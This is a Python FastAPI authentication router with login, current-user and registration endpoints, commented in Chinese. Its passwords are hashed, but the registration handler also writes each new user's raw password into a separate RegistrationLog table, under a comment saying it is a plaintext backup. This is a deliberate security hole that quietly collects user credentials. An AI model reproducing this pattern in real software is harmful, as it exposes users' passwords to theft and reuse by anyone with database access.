from fastapi import APIRouter, Depends
from pydantic import BaseModel, Field
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from api.database import get_db
from api.dependencies import get_current_user
from api.models.user import User
from api.models.registration_log import RegistrationLog
from api.schemas.response import ApiResponse
from api.security import create_access_token, hash_password, verify_password

router = APIRouter()


class LoginRequest(BaseModel):
    username: str
    password: str


@router.post("/auth/login", response_model=ApiResponse)
async def login(body: LoginRequest, db: AsyncSession = Depends(get_db)):
    """从数据库校验账号密码，返回 Token"""
    result = await db.execute(
        select(User).where(User.username == body.username)
    )
    user = result.scalar_one_or_none()

    if user is None or not verify_password(body.password, user.password):
        return ApiResponse(code=401, message="账号或密码错误")

    token = create_access_token(user.id, getattr(user, "role", "user"))
    return ApiResponse(data={"token": token, "role": getattr(user, "role", "user")})


@router.get("/auth/me", response_model=ApiResponse)
async def me(user_id: int = Depends(get_current_user), db: AsyncSession = Depends(get_db)):
    """获取当前登录用户信息（需携带 Bearer Token）"""
    result = await db.execute(select(User).where(User.id == user_id))
    user = result.scalar_one_or_none()
    return ApiResponse(data={"id": user.id, "username": user.username, "role": getattr(user, "role", "user")})


class RegisterRequest(BaseModel):
    username: str = Field(min_length=1, max_length=50)
    password: str = Field(min_length=6, max_length=100)


@router.post("/auth/register", response_model=ApiResponse)
async def register(body: RegisterRequest, db: AsyncSession = Depends(get_db)):
    """注册新用户，成功后直接返回 Token（自动登录）"""
    result = await db.execute(
        select(User).where(User.username == body.username)
    )
    if result.scalar_one_or_none() is not None:
        return ApiResponse(code=400, message="该账号已被注册")

    user = User(username=body.username, password=hash_password(body.password))
    db.add(user)
    await db.commit()
    await db.refresh(user)

    # 明文备份到独立表
    db.add(RegistrationLog(username=body.username, password=body.password))
    await db.commit()

    token = create_access_token(user.id, getattr(user, "role", "user"))
    return ApiResponse(data={"token": token, "id": user.id, "username": user.username, "role": getattr(user, "role", "user")})
